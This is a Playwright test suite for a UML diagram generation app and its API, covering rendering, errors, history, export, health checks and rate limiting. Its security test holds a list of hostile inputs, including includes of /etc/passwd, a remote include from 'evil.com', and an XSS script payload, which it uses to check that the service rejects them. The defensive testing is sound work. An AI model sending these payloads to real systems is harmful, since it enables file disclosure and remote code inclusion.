const { test, expect } = require('@playwright/test');

const API_URL = process.env.API_URL || 'http://localhost:9001';
const UI_URL = process.env.UI_URL || 'http://localhost:9002';

test.describe('UML Diagram Generation', () => {
  test.beforeEach(async ({ page }) => {
    // Navigate to the application
    await page.goto('/');
    
    // Wait for the page to load
    await expect(page).toHaveTitle(/UML/i);
  });

  test('should generate a simple sequence diagram', async ({ page }) => {
    // Fill in UML code
    const umlCode = '@startuml\nAlice -> Bob: Hello\nBob -> Alice: Hi there!\n@enduml';
    
    await page.fill('[data-testid="uml-input"]', umlCode);
    
    // Click generate button
    await page.click('[data-testid="generate-button"]');
    
    // Wait for diagram to be generated
    await expect(page.locator('[data-testid="diagram-output"]')).toBeVisible({ timeout: 10000 });
    
    // Check if image is loaded
    const diagramImage = page.locator('[data-testid="diagram-image"]');
    await expect(diagramImage).toBeVisible();
    
    // Verify image source is not empty
    const imageSrc = await diagramImage.getAttribute('src');
    expect(imageSrc).toBeTruthy();
    expect(imageSrc).toContain('data:image/');
  });

  test('should handle invalid UML syntax gracefully', async ({ page }) => {
    // Fill in invalid UML code
    const invalidUmlCode = '@startuml\nInvalid syntax here\n@enduml';
    
    await page.fill('[data-testid="uml-input"]', invalidUmlCode);
    
    // Click generate button
    await page.click('[data-testid="generate-button"]');
    
    // Wait for error message
    await expect(page.locator('[data-testid="error-message"]')).toBeVisible({ timeout: 5000 });
    
    // Check error message content
    const errorText = await page.locator('[data-testid="error-message"]').textContent();
    expect(errorText).toContain('error');
  });

  test('should generate different types of diagrams', async ({ page }) => {
    const diagramTypes = [
      {
        name: 'Class Diagram',
        uml: '@startuml\nclass Car {\n  +start()\n  +stop()\n}\nclass Engine\nCar --> Engine\n@enduml'
      },
      {
        name: 'Activity Diagram',
        uml: '@startuml\nstart\n:Read input;\n:Process data;\nstop\n@enduml'
      },
      {
        name: 'Use Case Diagram',
        uml: '@startuml\nactor User\nUser --> (Login)\nUser --> (Generate Diagram)\n@enduml'
      }
    ];

    for (const diagram of diagramTypes) {
      // Clear previous input
      await page.fill('[data-testid="uml-input"]', '');
      
      // Fill in new UML code
      await page.fill('[data-testid="uml-input"]', diagram.uml);
      
      // Click generate button
      await page.click('[data-testid="generate-button"]');
      
      // Wait for diagram to be generated
      await expect(page.locator('[data-testid="diagram-output"]')).toBeVisible({ timeout: 10000 });
      
      // Verify image is generated
      const diagramImage = page.locator('[data-testid="diagram-image"]');
      await expect(diagramImage).toBeVisible();
      
      console.log(`✅ ${diagram.name} generated successfully`);
    }
  });

  test('should show loading state during generation', async ({ page }) => {
    // Fill in UML code
    const umlCode = '@startuml\nAlice -> Bob: Hello\n@enduml';
    await page.fill('[data-testid="uml-input"]', umlCode);
    
    // Click generate button
    await page.click('[data-testid="generate-button"]');
    
    // Check for loading indicator
    await expect(page.locator('[data-testid="loading-indicator"]')).toBeVisible();
    
    // Wait for generation to complete
    await expect(page.locator('[data-testid="loading-indicator"]')).toBeHidden({ timeout: 10000 });
    
    // Verify diagram is shown
    await expect(page.locator('[data-testid="diagram-output"]')).toBeVisible();
  });

  test('should handle network timeouts gracefully', async ({ page }) => {
    // Intercept API requests and delay them
    await page.route('**/api/v1/generate', async route => {
      await page.waitForTimeout(35000); // Delay longer than timeout
      await route.continue();
    });
    
    // Fill in UML code
    const umlCode = '@startuml\nAlice -> Bob: Hello\n@enduml';
    await page.fill('[data-testid="uml-input"]', umlCode);
    
    // Click generate button
    await page.click('[data-testid="generate-button"]');
    
    // Check for timeout error
    await expect(page.locator('[data-testid="error-message"]')).toBeVisible({ timeout: 40000 });
    
    const errorText = await page.locator('[data-testid="error-message"]').textContent();
    expect(errorText.toLowerCase()).toContain('timeout');
  });

  test('should save and load diagrams from history', async ({ page }) => {
    // Generate first diagram
    const firstUml = '@startuml\nAlice -> Bob: First\n@enduml';
    await page.fill('[data-testid="uml-input"]', firstUml);
    await page.click('[data-testid="generate-button"]');
    await expect(page.locator('[data-testid="diagram-output"]')).toBeVisible({ timeout: 10000 });
    
    // Generate second diagram
    const secondUml = '@startuml\nAlice -> Bob: Second\n@enduml';
    await page.fill('[data-testid="uml-input"]', secondUml);
    await page.click('[data-testid="generate-button"]');
    await expect(page.locator('[data-testid="diagram-output"]')).toBeVisible({ timeout: 10000 });
    
    // Check history
    await page.click('[data-testid="history-button"]');
    await expect(page.locator('[data-testid="history-panel"]')).toBeVisible();
    
    // Verify both diagrams are in history
    const historyItems = page.locator('[data-testid="history-item"]');
    expect(await historyItems.count()).toBeGreaterThanOrEqual(2);
    
    // Load first diagram from history
    await historyItems.first().click();
    
    // Verify correct diagram is loaded
    const inputValue = await page.locator('[data-testid="uml-input"]').inputValue();
    expect(inputValue).toContain('First');
  });

  test('should export diagrams in different formats', async ({ page }) => {
    // Generate a diagram
    const umlCode = '@startuml\nAlice -> Bob: Hello\n@enduml';
    await page.fill('[data-testid="uml-input"]', umlCode);
    await page.click('[data-testid="generate-button"]');
    await expect(page.locator('[data-testid="diagram-output"]')).toBeVisible({ timeout: 10000 });
    
    // Test PNG export
    const downloadPromise = page.waitForEvent('download');
    await page.click('[data-testid="export-png"]');
    const download = await downloadPromise;
    expect(download.suggestedFilename()).toMatch(/\.png$/);
    
    // Test SVG export if available
    if (await page.locator('[data-testid="export-svg"]').isVisible()) {
      const svgDownloadPromise = page.waitForEvent('download');
      await page.click('[data-testid="export-svg"]');
      const svgDownload = await svgDownloadPromise;
      expect(svgDownload.suggestedFilename()).toMatch(/\.svg$/);
    }
  });
});

test.describe('API Health and Performance', () => {
  test('should respond to health checks quickly', async ({ request }) => {
    const start = Date.now();
    const response = await request.get(`${API_URL}/health`);
    const duration = Date.now() - start;
    
    expect(response.status()).toBe(200);
    expect(duration).toBeLessThan(1000); // Should respond within 1 second
    
    const body = await response.json();
    expect(body).toHaveProperty('status', 'healthy');
    expect(body).toHaveProperty('service', 'api-service');
  });

  test('should provide metrics endpoint', async ({ request }) => {
    const response = await request.get(`${API_URL}/metrics`);
    
    expect(response.status()).toBe(200);
    expect(response.headers()['content-type']).toContain('text/plain');
    
    const body = await response.text();
    expect(body).toContain('# HELP');
    expect(body).toContain('# TYPE');
  });

  test('should handle concurrent diagram generations', async ({ request }) => {
    const umlCode = '@startuml\nAlice -> Bob: Concurrent test\n@enduml';
    const requests = [];
    
    // Send 10 concurrent requests
    for (let i = 0; i < 10; i++) {
      requests.push(
        request.post(`${API_URL}/api/v1/generate`, {
          data: { uml: umlCode },
          headers: { 'Content-Type': 'application/json' }
        })
      );
    }
    
    const responses = await Promise.all(requests);
    
    // All requests should succeed
    responses.forEach((response, index) => {
      expect(response.status(), `Request ${index + 1} failed`).toBe(200);
    });
  });
});

test.describe('Security Tests', () => {
  test('should reject malicious UML input', async ({ request }) => {
    const maliciousInputs = [
      '!include /etc/passwd',
      '!include http://evil.com/malware',
      '@startuml\n!include <script>alert("xss")</script>\n@enduml',
      '@startuml\n!define EVIL !include /etc/passwd\n@enduml'
    ];
    
    for (const maliciousInput of maliciousInputs) {
      const response = await request.post(`${API_URL}/api/v1/generate`, {
        data: { uml: maliciousInput },
        headers: { 'Content-Type': 'application/json' }
      });
      
      // Should either reject (400/403) or sanitize the input
      expect([200, 400, 403]).toContain(response.status());
      
      if (response.status() === 200) {
        // If accepted, verify the response doesn't contain sensitive data
        const body = await response.text();
        expect(body).not.toContain('root:');
        expect(body).not.toContain('password');
      }
    }
  });

  test('should have proper security headers', async ({ request }) => {
    const response = await request.get(`${UI_URL}/`);
    
    expect(response.status()).toBe(200);
    
    const headers = response.headers();
    expect(headers).toHaveProperty('x-frame-options');
    expect(headers).toHaveProperty('x-content-type-options', 'nosniff');
    expect(headers).toHaveProperty('referrer-policy');
    expect(headers).toHaveProperty('content-security-policy');
  });

  test('should rate limit excessive requests', async ({ request }) => {
    const umlCode = '@startuml\nAlice -> Bob: Rate limit test\n@enduml';
    let rateLimited = false;
    
    // Send many requests quickly
    for (let i = 0; i < 100; i++) {
      const response = await request.post(`${API_URL}/api/v1/generate`, {
        data: { uml: umlCode },
        headers: { 'Content-Type': 'application/json' }
      });
      
      if (response.status() === 429) {
        rateLimited = true;
        break;
      }
      
      // Small delay between requests
      await new Promise(resolve => setTimeout(resolve, 10));
    }
    
    expect(rateLimited).toBe(true);
  });
});